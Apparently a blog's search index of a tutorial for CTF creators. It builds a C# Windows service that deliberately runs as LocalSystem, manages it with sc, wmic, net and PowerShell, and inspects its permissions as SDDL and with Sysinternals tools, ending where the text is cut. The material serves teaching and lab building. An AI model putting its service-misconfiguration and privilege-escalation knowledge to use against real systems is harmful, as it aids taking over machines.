[{"categories":["Windows Local Privilege Escalation"],"content":"Windows Local Privilege Escalation - Services","date":"2022-03-20","objectID":"/windows-privesc-services/","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"Services Services are programs that run in the background. Most of them perform tasks, while others can accept input and process data. If services are run by the LocalSystem account instead of the LocalService account, it means that we can escalate privileges to the NT-AUTHORITY\\SYSTEM (LocalSystem) account if the service is misconfigured. The LocalSystem account, known as NT-AUTHORITY\\SYSTEM, is a powerful account with unrestricted access to all local system resources, which can be dangerous. As a rule of thumb, we should always try to run these services as the LocalService account (NT AUTHORITY\\LocalService) or the NetworkService account (NT-AUTHORITY\\NetworkService), especially for custom services written in C++ or C#. Services can be developed in C++ or C#: C++: The most traditional way to develop a service. C#: Utilizes the .NET framework to develop services more easily and with less code. Note: Modern services are being developed with BackgroundService and the Worker Services in .NET framework. In Windows Server 2003 we cannot run a scheduled task with the following service accounts: NT_AUTHORITY\\LocalService (also known as the Local Service account) NT AUTHORITY\\NetworkService (also known as the Network Service account) That capability only was added with Task Scheduler 2.0, which only exists in Windows Vista/Windows Server 2008 and newer. Note: We can always find more information about services in the microsoft documentation. ","date":"2022-03-20","objectID":"/windows-privesc-services/:0:0","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"Service Access Rights Services have an ACL attached to them. As system administrators and as developers we must be careful about the access rights that we assign to these services. The Service Control Manager (SCM) creates a service object’s security descriptor when the service is installed, this is done by the CreateService function. The default security descriptor of a service object grants the following access rights: Account Access Rights Remote Authenticated Users These access rights are the same as the Local Authenticated Users. Local Authenticated Users READ_CONTROL SERVICE_ENUMERATE_DEPENDENTS SERVICE_INTERROGATE SERVICE_QUERY_CONFIG SERVICE_QUERY_STATUS SERVICE_USER_DEFINED_CONTROL LocalSystem READ_CONTROL SERVICE_ENUMERATE_DEPENDENTS SERVICE_INTERROGATE SERVICE_PAUSE_CONTINUE SERVICE_QUERY_CONFIG SERVICE_QUERY_STATUS SERVICE_QUERY_START SERVICE_QUERY_STOP SERVICE_USER_DEFINED_CONTROL Administrators DELETE READ_CONTROL SERVICE_ALL_ACCESS WRITE_DAC WRITE_OWNER These are the most interesting access rights: SERVICE_QUERY_CONFIG: Allows us to query the service configuration. SERVICE_QUERY_STATUS: Allows us to query the status of the service. SERVICE_START: Allows us to start the service. SERVICE_STOP: Allows us to stop the service. SERVICE_CHANGE_CONFIG: Allows us to change the configuration of the service. SERVICE_ALL_ACCESS: Allows us to do anything on the service. ","date":"2022-03-20","objectID":"/windows-privesc-services/:1:0","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"Custom Service in C Sharp .NET Framework Warning\rThe code in this section is sourced from the official Microsoft documentation. As engineers working on vulnerable machines or creating Capture The Flag (CTF) challenges, it is essential to develop our own code and, more importantly, to be creative with it. Our goal should always be to provide a valuable learning experience for CTF players. Repetitive vulnerabilities or challenges can diminish the learning experience over time, so creativity is key to maintaining engagement and educational value. Why did I choose to do this? As developers, it is crucial to be familiar with MSDN and the wealth of information available in Microsoft documentation. We do not always need a course, tutorial, write-up, or video to learn how to accomplish specific tasks, as much of this information is already well-documented. By reading this section, I hope you will become more aware of the resources available through documentation alone, enabling you to independently search for and create your own solutions. Once again, I want to clarify that this code is not my own. We’ll create a service following the official documentation at microsoft. I’ll pretty much do the same thing EXCEPT that we’ll build the service with the Service Control Manager. I’m gonna use Visual Studio Community 2022, I have already installed the workload of .NET desktop development with the Visual Studio Installer as shown below: VS Installer\r","date":"2022-03-20","objectID":"/windows-privesc-services/:2:0","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"Visual Studio Project - Create a Service We’ll begin by creating a project: VS Create Project\rNow we’ll select the project template Windows Service (.NET Framework): VS Project Template\rWe’ll rename the project, select a destination directory, and the .NET Framework: VS Destination\rNow the Design tab appears (Service1.cs [Design]) this project template includes a component class named Service1 that inherits from System.ServiceProcess.ServiceBase and according to the writeup it includes much of the basic service code: VS Service\rWe’ll rename the service from Service1 to VulnService, we can do this from the Solution Explorer, select Service1.cs and choose Rename (F2) from the shortcut menu. Rename the file to VulnService.cs and then press Enter: VS\rA pop-up window will appear asking whether we would like to rename all references to the code element Service1. In the pop-up window, we’re gonna select Yes: VS\rIn the Design tab, we’re gonna right-click from the mouse and select Properties from the shortcut menu: VS\rNow in the Properties window, we’re going to change the ServiceName value to VulnService: VS\rThen we’re going to select Save All (Ctrl+Shift+S) from the File menu: VS\r","date":"2022-03-20","objectID":"/windows-privesc-services/:2:1","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"Adding Features To The Service In this section, we’ll add a custom event log to the Windows service created by MS developers. The EventLog component is an example of the type of component we can add to a Windows service. Note: When creating a vulnerable machine / CTF machine create a cool service that is fun for the competitors. In this example, I’m only using MS code provided for building up a scenario. In the Solution Explorer, from the shortcut menu for VulnService.cs we’ll choose View Designer (Shift+F7): VS\rIn the Toolbox, we’re gonna expand Components, and then drag the EventLog component to the Service1.cs [Design] tab: VS\rIn the Solution Explorer, from the shortcut menu for VulnService.cs we’ll click on View Code (F7): VS\rWe’re gonna define a custom event log, Define a custom event log we’re editing the existing VulnService() constructor as shown in the following code snippet: public VulnService() { InitializeComponent(); eventLog1 = new System.Diagnostics.EventLog(); if (!System.Diagnostics.EventLog.SourceExists(\"MySource\")) { System.Diagnostics.EventLog.CreateEventSource( \"MySource\", \"MyNewLog\"); } eventLog1.Source = \"MySource\"; eventLog1.Log = \"MyNewLog\"; } Add a using statement to VulnService.cs (if it doesn’t already exist), or an Imports statement to VulnService.vb, for the System.Diagnostics namespace: using System.Diagnostics; Now we’re gonna select Save All from the File menu: VS Save All\r","date":"2022-03-20","objectID":"/windows-privesc-services/:2:2","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"Service Startup Now we’re gonna define the event that occurs when the service is started. In the code editor for VulnService.cs, we’ll locate the OnStart method. Visual Studio automatically created an empty method definition when we created the project so we’ll simply add code that writes an entry to the event log when the service starts: protected override void OnStart(string[] args) { eventLog1.WriteEntry(\"In OnStart.\"); } Since a service application is designed to be long-running, it usually polls or monitors the system, which we can set up in the OnStart method. We’ll do this because we don’t want the system to be blocked; the ‘OnStart’ method must return to the operating system when the service’s operation has begun. We’ll set up a simple polling mechanism by using the System.Timers.Timer component. This timer uses an Elapsed event at regular intervals, at which time the service can do its monitoring. Add a using statement to VulnSevice.cs for the System.Timers namespace: using System.Timers; We’re gonna add the following code in the VulnService.OnStart event to set up the polling mechanism. // Set up a timer that triggers every minute. Timer timer = new Timer(); timer.Interval = 60000; // 60 seconds timer.Elapsed += new ElapsedEventHandler(this.OnTimer); timer.Start(); In the VulnService class, we’ll add the OnTimer method to handle the Timer.Elapsed event: public void OnTimer(object sender, ElapsedEventArgs args) { // TODO: Insert monitoring activities here. eventLog1.WriteEntry(\"Monitoring the System\", EventLogEntryType.Information, eventId++); } In the VulnService class, we’ll add a member variable that contains the identifier of the next event to write into the event log: private int eventId = 1; ","date":"2022-03-20","objectID":"/windows-privesc-services/:2:3","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"Service Stop Now we’re gonna define the event that occurs when the service is stopped. We’ll insert a line of code in the OnStop method which adds an entry to the event log when the service is stopped: protected override void OnStop() { eventLog1.WriteEntry(\"In OnStop.\"); } ","date":"2022-03-20","objectID":"/windows-privesc-services/:2:4","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"General Actions We’re gonna override the OnPause, OnContinue, and OnShutdown methods to define additional processing for your component. The following code shows how we can override the OnContinue method in the VulnService class: protected override void OnContinue() { eventLog1.WriteEntry(\"In OnContinue.\"); } ","date":"2022-03-20","objectID":"/windows-privesc-services/:2:5","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"Setting Service Status An essential part of a service is report of its status to the Service Control Manager this way a user can notice whether a service is functioning correctly. According to the documentation, by default, a service that inherits from ServiceBase reports a limited set of status settings, which include: SERVICE_STOPPED: When the service stops SERVICE_PAUSED: When the service is paused SERVICE_RUNNING: When the service is running SERVICE_START_PENDING: When the service is pending to start, it can fail. We’ll add a using statement to VulnService.cs for the System.Runtime.InteropServices namespace: using System.Runtime.InteropServices; Then we’re going to add the following code to VulnService.cs which it’ll declare the ServiceState values and add a structure for the status, which we’ll use in a platform invoke call: public enum ServiceState { SERVICE_STOPPED = 0x00000001, SERVICE_START_PENDING = 0x00000002, SERVICE_STOP_PENDING = 0x00000003, SERVICE_RUNNING = 0x00000004, SERVICE_CONTINUE_PENDING = 0x00000005, SERVICE_PAUSE_PENDING = 0x00000006, SERVICE_PAUSED = 0x00000007, } [StructLayout(LayoutKind.Sequential)] public struct ServiceStatus { public int dwServiceType; public ServiceState dwCurrentState; public int dwControlsAccepted; public int dwWin32ExitCode; public int dwServiceSpecificExitCode; public int dwCheckPoint; public int dwWaitHint; }; In the VulnService class we’ll declare the SetServiceStatus function by using platform invoke: [DllImport(\"advapi32.dll\", SetLastError = true)] private static extern bool SetServiceStatus(System.IntPtr handle, ref ServiceStatus serviceStatus); Now we’ll implement the SERVICE_START_PENDING status by adding the following code to the beginning of the OnStart method: // Update the service state to Start Pending. ServiceStatus serviceStatus = new ServiceStatus(); serviceStatus.dwCurrentState = ServiceState.SERVICE_START_PENDING; serviceStatus.dwWaitHint = 100000; SetServiceStatus(this.ServiceHandle, ref serviceStatus); Now we’ll add this code to the end of the OnStart method to set the status to SERVICE_RUNNING: // Update the service state to Running. serviceStatus.dwCurrentState = ServiceState.SERVICE_RUNNING; SetServiceStatus(this.ServiceHandle, ref serviceStatus); Optionally, we’ll implement the SERVICE_STOP_PENDING status and return the SERVICE_STOPPED status before the OnStop method exits: // Update the service state to Stop Pending. ServiceStatus serviceStatus = new ServiceStatus(); serviceStatus.dwCurrentState = ServiceState.SERVICE_STOP_PENDING; serviceStatus.dwWaitHint = 100000; SetServiceStatus(this.ServiceHandle, ref serviceStatus); // Update the service state to Stopped. serviceStatus.dwCurrentState = ServiceState.SERVICE_STOPPED; SetServiceStatus(this.ServiceHandle, ref serviceStatus); The VulnService.cs file ends up looking something like this: using System; using System.Collections.Generic; using System.ComponentModel; using System.Data; using System.Diagnostics; using System.Linq; using System.ServiceProcess; using System.Text; using System.Threading.Tasks; using System.Timers; using System.Runtime.InteropServices; namespace VulnService { public partial class VulnService : ServiceBase { [DllImport(\"advapi32.dll\", SetLastError = true)] private static extern bool SetServiceStatus(System.IntPtr handle, ref ServiceStatus serviceStatus); private int eventId = 1; public VulnService() { InitializeComponent(); eventLog1 = new System.Diagnostics.EventLog(); if (!System.Diagnostics.EventLog.SourceExists(\"MySource\")) { System.Diagnostics.EventLog.CreateEventSource( \"MySource\", \"MyNewLog\"); } eventLog1.Source = \"MySource\"; eventLog1.Log = \"MyNewLog\"; } protected override void OnStart(string[] args) { // Update the service state to Start Pending. ServiceStatus serviceStatus = new ServiceStatus(); serviceStatus.dwCurrentState = ServiceState.SERVICE_START_PENDING; serviceStatus.dwWaitHint = 100000; SetServiceStatus(this.ServiceHandle, ref serviceStatus); eventLog1.WriteEntr","date":"2022-03-20","objectID":"/windows-privesc-services/:2:6","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"Building The Service using SC We’ll build the solution now: VS Build Solution\rLet’s see if the executable was compiled or created: PS C:\\\u003e dir C:\\Users\\user\\Desktop\\VulnService\\VulnService\\bin\\Debug\\VulnService.exe Directory: C:\\Users\\user\\Desktop\\VulnService\\VulnService\\bin\\Debug Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 3/9/2022 12:06 AM 7168 VulnService.exe We’re gonna run a command prompt as administrator or a PowerShell console as administrator to create the service: C:\\Windows\\system32\u003esc.exe create \"VulnService\" binpath= \"C:\\Users\\user\\Desktop\\VulnService\\VulnService\\bin\\Debug\\VulnService.exe\" [SC] CreateService SUCCESS Let’s query the configuration of the service: C:\\Windows\\system32\u003esc qc \"VulnService\" [SC] QueryServiceConfig SUCCESS SERVICE_NAME: VulnService TYPE : 10 WIN32_OWN_PROCESS START_TYPE : 3 DEMAND_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:\\Users\\user\\Desktop\\VulnService\\VulnService\\bin\\Debug\\VulnService.exe LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : VulnService DEPENDENCIES : SERVICE_START_NAME : LocalSystem Now we’re gonna attempt to start the service: C:\\Windows\\system32\u003esc start \"VulnService\" SERVICE_NAME: VulnService TYPE : 10 WIN32_OWN_PROCESS STATE : 2 START_PENDING (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN) WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x7d0 PID : 4892 FLAGS : Note: We can see the START_PENDING state. Now we are going to query the current status of a service: C:\\Windows\\system32\u003esc query \"VulnService\" SERVICE_NAME: VulnService TYPE : 10 WIN32_OWN_PROCESS STATE : 4 RUNNING (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN) WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x0 We can see at the STATE value that’s RUNNING. Now let’s see if we can stop the service: C:\\Windows\\system32\u003esc stop \"VulnService\" SERVICE_NAME: VulnService TYPE : 10 WIN32_OWN_PROCESS STATE : 3 STOP_PENDING (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN) WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x0 Note: We can see the STOP_PENDING state. Again we are going to query the current status of a service: C:\\Windows\\system32\u003esc query \"VulnService\" SERVICE_NAME: VulnService TYPE : 10 WIN32_OWN_PROCESS STATE : 1 STOPPED WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x0 The service STATE value changed to STOPPED, so the service stopped. Now we know that the service worked successfully as expected. ","date":"2022-03-20","objectID":"/windows-privesc-services/:3:0","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"Managing Services with Services.msc Most system administrators use the services.msc application to manage services: Services.msc\rThe Service Control Manager assigns the user LocalSystem upon creating a service by default and custom services shouldn’t be run as NT AUTHORITY\\SYSTEM: Service Account LocalSystem\rIf we can compromise this service we can escalate to LocalSystem ( NT AUTHORITY\\SYSTEM). ","date":"2022-03-20","objectID":"/windows-privesc-services/:4:0","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"Managing Services via Service Control Manager Query the configuration of a service: sc.exe qc \u003cname\u003e Query the current status of a service: sc.exe query \u003cname\u003e Modify the configuration of a service: sc.exe config \u003cname\u003e \u003coption\u003e= \u003cvalue\u003e Start or Stop a service: sc start \"VulnService\" sc stop \"VulnService\" Note: This Service Control Manager commands don’t work well with PowerShell, they must be runned from a command-prompt. ","date":"2022-03-20","objectID":"/windows-privesc-services/:5:0","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"Managing Services via WMIC Alternatively, we can use wmic: C:\\Windows\\system32\u003ewmic service VulnService call startservice Executing (\\\\desktop-bn\\ROOT\\CIMV2:Win32_Service.Name=\"VulnService\")-\u003estartservice() Method execution successful. Out Parameters: instance of __PARAMETERS { ReturnValue = 0; }; C:\\Windows\\system32\u003ewmic service VulnService call stopservice Executing (\\\\desktop-bn\\ROOT\\CIMV2:Win32_Service.Name=\"VulnService\")-\u003estopservice() Method execution successful. Out Parameters: instance of __PARAMETERS { ReturnValue = 0; }; Note: This WMIC commands don’t work well with PowerShell, they must be runned from a command-prompt. ","date":"2022-03-20","objectID":"/windows-privesc-services/:6:0","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"Managing Services via NET We can also use the net command: C:\\Windows\\system32\u003enet stop VulnService The VulnService service is stopping. The VulnService service was stopped successfully. C:\\Windows\\system32\u003enet start VulnService The VulnService service is starting. The VulnService service was started successfully. ","date":"2022-03-20","objectID":"/windows-privesc-services/:7:0","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"Managing Services via PowerShell CMD is old and modern attacks execute cmdlets in memory to avoid detection. We could also create custom cmdlets to be more stealthy, but that’s beyond this article. I’m gonna keep it simple and just demonstrate some cmdlets that we can use to manage services and nothing more. The following cmdlets are in PowerShell 7.2 (LTS). Get help on service cmdlets: PS C:\\Windows\\system32\u003e Get-Help *-Service Resume-Service Cmdlet Microsoft.PowerShell.M... Resume-Service... Restart-Service Cmdlet Microsoft.PowerShell.M... Restart-Service... Set-Service Cmdlet Microsoft.PowerShell.M... Set-Service... Get-Service Cmdlet Microsoft.PowerShell.M... Get-Service... Suspend-Service Cmdlet Microsoft.PowerShell.M... Suspend-Service... Start-Service Cmdlet Microsoft.PowerShell.M... Start-Service... Stop-Service Cmdlet Microsoft.PowerShell.M... Stop-Service... New-Service Cmdlet Microsoft.PowerShell.M... New-Service... Find information about a service using its name: PS C:\\Windows\\system32\u003e Get-Service -Name VulnService Status Name DisplayName ------ ---- ----------- Running VulnService VulnService Find information about a service using its display name: PS C:\\Windows\\system32\u003e Get-Service -DisplayName VulnService Status Name DisplayName ------ ---- ----------- Running VulnService VulnService Find information about services running on remote computers or workstations: Get-Service -ComputerName Server01 Note: The ComputerName parameter accepts multiple values and wildcard characters, so you can get the services on multiple computers with a single command. The following cmdlet gets the services that the LanmanWorkstation service requires: Get-Service -Name LanmanWorkstation -RequiredServices The following cmdlet gets the services that require the LanmanWorkstation service: Get-Service -Name LanmanWorkstation -DependentServices We can even get all services that have dependencies. The following cmdlet does just that, and then it uses the Format-Table cmdlet to display the Status, Name, RequiredServices and DependentServices properties of the services on the computer: Get-Service -Name * | Where-Object {$_.RequiredServices -or $_.DependentServices} | Format-Table -Property Status, Name, RequiredServices, DependentServices -auto We can stop service with the following cmdlet: PS C:\\Windows\\system32\u003e Stop-Service -Name VulnService PS C:\\Windows\\system32\u003e Get-Service -Name VulnService Status Name DisplayName ------ ---- ----------- Stopped VulnService VulnService We can start a service with the following cmdlet: PS C:\\Windows\\system32\u003e Start-Service -Name VulnService PS C:\\Windows\\system32\u003e Get-Service -Name VulnService Status Name DisplayName ------ ---- ----------- Running VulnService VulnService We can suspend service with the following cmdlet (we didn’t add suspend support): Suspend-Service -Name \u003cname\u003e We can restart a service with the following cmdlet: PS C:\\Windows\\system32\u003e Restart-Service -Name VulnService PS C:\\Windows\\system32\u003e Get-Service -Name VulnService Status Name DisplayName ------ ---- ----------- Running VulnService VulnService If we are an administrator we could also set up service properties with the Set-Service cmdlet, this can be done on a local or remote computer. Additionally, we could change the startup type of the service with the StartupType parameter. Services Permissions Each service can have a set of permissions, just as file system objects and registry keys. Who can stop, query, change the startup type, edit the service configuration, or delete the service depending on its permission entries? In this section, we’ll see how to view service permissions and modify them. There are many tools available to query and/or modify the service permissions. We’ll see a few methods. Note: These are the service security and access rights in Windows. The permissions of a service is stored in this registry key, in a REG_BINARY value named Security: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\[service_nam","date":"2022-03-20","objectID":"/windows-privesc-services/:8:0","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"View service permissions We’ll see a few methods that we can use to view service permissions. ","date":"2022-03-20","objectID":"/windows-privesc-services/:9:0","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"SC.exe We’re gonna use a command prompt command line as administrator: C:\\Users\\user\u003esc.exe sdshow \"VulnService\" D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU) It returns an SDDL output called “security descriptors” that looks like the following: D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU) The above output shows the VulnService service’s permission entries in Security Descriptor Definition Language (SDDL) format. The SDDL output can contain either DACL or SACL entries. A DACL identifies users and groups who are allowed or denied access to an object. The SACL defines how access is audited on an object. SACL enables administrators to log attempts to access a secured object. Note: In this article, we’ll only cover the DACL (denoted by the D: at the beginning.) SACL is for a different purpose and is out of the scope of this article. Here is a list of tables that describe the meaning of each security descriptor: D: Discretionary Access Control List (DACL) S: System Access Control List (SACL) ACE type Meaning A Access Allowed ACE flags string Meaning CC SERVICE_QUERY_CONFIG Query the SCM for the service configuration LC SERVICE_QUERY_STATUS Query the SCM the current status of the service SW SERVICE_ENUMERATE_DEPENDENTS List dependent services LO SERVICE_INTERROGATE Query the service its current status RC READ_CONTROL Query the security descriptor of the service RP SERVICE_START Start the service DT SERVICE_PAUSE_CONTINUE Pause/Resume the service CR SERVICE_USER_DEFINED_CONTROL Required to call the CreateService function to specify a user-defined control code WD WRITE_DAC Change the permissions of the service WO WRITE_OWNER Change the owner in the object’s security descriptor WP SERVICE_STOP Stop the service DC SERVICE_CHANGE_CONFIG Change service configuration SD DELETE The right to delete the service We can find more information at ACE Strings and Service Security and Access Rights at Microsoft Docs website. The security principal issued with these rights is represented by the final two characters after the ACE strings. Abbreviation Security Principal AU Authenticated Users BA Built-in administrators SY Local System BU Built-in users WD Everyone Let’s see what rights the “built-in administrators” group has, as per this SDDL. D: (A;;CCLCSWRPWPDTLOCRRC;;;SY) (A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA) # Full permissions (A;;CCLCSWLOCRRC;;;IU) (A;;CCLCSWLOCRRC;;;SU) The Built-in administrators group has full permission: (A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA) ACE flags string CC SERVICE_QUERY_CONFIG Query the SCM for the service configuration LC SERVICE_QUERY_STATUS Query the SCM the current status of the service SW SERVICE_ENUMERATE_DEPENDENTS List dependent services LO SERVICE_INTERROGATE Query the service its current status RC READ_CONTROL Query the security descriptor of the service RP SERVICE_START Start the service DT SERVICE_PAUSE_CONTINUE Pause/Resume the service CR SERVICE_USER_DEFINED_CONTROL WD WRITE_DAC Change the permissions of the service WO WRITE_OWNER Change the ownership of the service WP SERVICE_STOP Stop the service DC SERVICE_CHANGE_CONFIG Change service configuration SD DELETE The right to delete the service As we can see, the Built-in administrators user has full permissions (SERVICE_ALL_ACCESS), and it can do anything with this service. ","date":"2022-03-20","objectID":"/windows-privesc-services/:9:1","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"SysInternals AccessChk Query the service permissions using AccessChk, and run this command from an administrator command prompt: C:\\Tools\\SysInternalsSuite\\accesschk.exe /accepteula -c \"VulnService\" -l We’ll see the following output: C:\\Users\\user\u003eC:\\Tools\\SysInternalsSuite\\accesschk.exe /accepteula -c \"VulnService\" -l Accesschk v6.14 - Reports effective permissions for securable objects Copyright ⌐ 2006-2021 Mark Russinovich Sysinternals - www.sysinternals.com VulnService DESCRIPTOR FLAGS: [SE_DACL_PRESENT] [SE_SACL_PRESENT] [SE_SELF_RELATIVE] OWNER: NT AUTHORITY\\SYSTEM [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\\SYSTEM SERVICE_QUERY_STATUS SERVICE_QUERY_CONFIG SERVICE_INTERROGATE SERVICE_ENUMERATE_DEPENDENTS SERVICE_PAUSE_CONTINUE SERVICE_START SERVICE_STOP SERVICE_USER_DEFINED_CONTROL READ_CONTROL [1] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\\Administrators SERVICE_ALL_ACCESS [2] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\\INTERACTIVE SERVICE_QUERY_STATUS SERVICE_QUERY_CONFIG SERVICE_INTERROGATE SERVICE_ENUMERATE_DEPENDENTS SERVICE_USER_DEFINED_CONTROL READ_CONTROL [3] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\\SERVICE SERVICE_QUERY_STATUS SERVICE_QUERY_CONFIG SERVICE_INTERROGATE SERVICE_ENUMERATE_DEPENDENTS SERVICE_USER_DEFINED_CONTROL READ_CONTROL The above output is a representation of the SDDL (security descriptor). ","date":"2022-03-20","objectID":"/windows-privesc-services/:9:2","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"SysInternals PsService Query the service permissions using PsService.exe or PsService64.exe, and run this command from an administrator command prompt: C:\\Users\\user\u003eC:\\Tools\\SysInternalsSuite\\psservice.exe security \"VulnService\" PsService v2.25 - Service information and configuration utility Copyright (C) 2001-2010 Mark Russinovich Sysinternals - www.sysinternals.com SERVICE_NAME: VulnService DISPLAY_NAME: VulnService ACCOUNT: LocalSystem SECURITY: [ALLOW] NT AUTHORITY\\SYSTEM Query status Query Config Interrogate Enumerate Dependents Pause/Resume Start Stop User-Defined Control Read Permissions [ALLOW] BUILTIN\\Administrators All [ALLOW] NT AUTHORITY\\INTERACTIVE Query status Query Config Interrogate Enumerate Dependents User-Defined Control Read Permissions [ALLOW] NT AUTHORITY\\SERVICE Query status Query Config Interrogate Enumerate Dependents User-Defined Control Read Permissions As we can see above, the output generated by AccessChk and PsService utilities is very friendly. ","date":"2022-03-20","objectID":"/windows-privesc-services/:9:3","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege escalation","windows"],"title":"Windows Local Privilege Escalation - Services for CTF Creators","uri":"/windows-privesc-services/"},{"categories":["Windows Local Privilege Escalation"],"content":"SetACL.exe The SetACL.exe command-line application (by Helge Klein) is a fantastic command-line tool for automating permissions in Windows. SetACL allows us to alter and inspect ownership and permissions for the file system, registry, printers, network shares, and services, among other things. We can download it here. View the permissions of a service (e.g., VulnService service), run this command from a command-prompt running as administrator: C:\\Users\\user\\Desktop\\64 bit\u003e.\\SetACL.exe -on \"VulnService\" -ot srv -actn list VulnService DACL(not_protected): SYSTEM start_stop allow no_inheritance Administrators full allow no_inheritance INTERACTIVE read allow no_inheritance SERVICE read allow no_inheritance SetACL finished successfully. -on : ObjectName -ot : ObjectType -actn : Action to take We can also view the SDDL format: C:\\Users\\user\\Desktop\\64 bit\u003e.\\SetACL.exe -on \"VulnService\" -ot srv -actn list -lst \"f:sddl\" \"VulnService\",2,\"D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)\" SetACL finished successfully. ","date":"2022-03-20","objectID":"/windows-privesc-services/:9:4","tags":["services","unquoted path service","insecure registry hives","insecure service executable","insecure service permissions","local privilege 